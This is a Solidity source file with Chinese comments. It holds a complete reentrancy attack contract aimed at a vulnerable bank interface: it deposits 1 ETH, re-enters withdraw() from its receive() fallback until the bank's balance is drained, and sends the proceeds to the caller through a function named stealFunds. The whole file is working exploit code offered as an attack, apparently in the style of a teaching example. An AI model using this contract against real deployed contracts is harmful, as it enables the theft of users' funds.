// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IVulnerableBank public bank;
    
    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }
    
    // 攻击函数
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
    
    // 回退函数 - 重入攻击的入口点
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
    
    function stealFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}